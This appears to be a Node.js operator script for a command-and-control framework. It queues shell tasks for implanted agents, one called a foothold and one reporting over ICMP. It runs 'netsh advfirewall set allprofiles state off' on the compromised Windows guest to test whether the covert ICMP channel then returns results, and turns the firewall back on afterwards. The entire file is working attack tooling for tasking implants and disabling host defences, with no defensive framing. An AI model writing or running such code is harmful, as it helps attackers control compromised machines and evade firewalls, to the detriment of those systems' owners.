// fw-ab-live.mjs <footholdId> <icmpAgentId> — the cleanest A/B: queue a task for the
// LIVE icmp agent, drop the guest firewall for 45s, watch for the result over ICMP.
const API = 'http://127.0.0.1:8971';
const [FOOTHOLD, ICMP] = [process.argv[2], process.argv[3]];
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}
async function shell(agentId, data, s = 30) { const t = await j('/api/channel/task', { agentId, kind: 'shell', data }); return waitTask(agentId, t.taskId, s); }

const t = await j('/api/channel/task', { agentId: ICMP, kind: 'shell', data: 'hostname' });
console.log('icmp task queued:', t.taskId);
console.log('FW OFF:', JSON.stringify(await shell(FOOTHOLD, 'netsh advfirewall set allprofiles state off')));
let res = null;
for (let i = 0; i < 22 && !res; i++) {
  await sleep(2000);
  const { tasks } = await j('/api/channel/tasks?agent=' + ICMP);
  const x = (tasks || []).find((y) => y.taskId === t.taskId);
  if (x && x.status === 'resulted') res = x.resultPreview;
}
console.log('FW ON:', JSON.stringify(await shell(FOOTHOLD, 'netsh advfirewall set allprofiles state on')));
console.log('AB-RESULT:', res === null ? 'NO-RESULT-WITH-FW-OFF' : JSON.stringify(res));
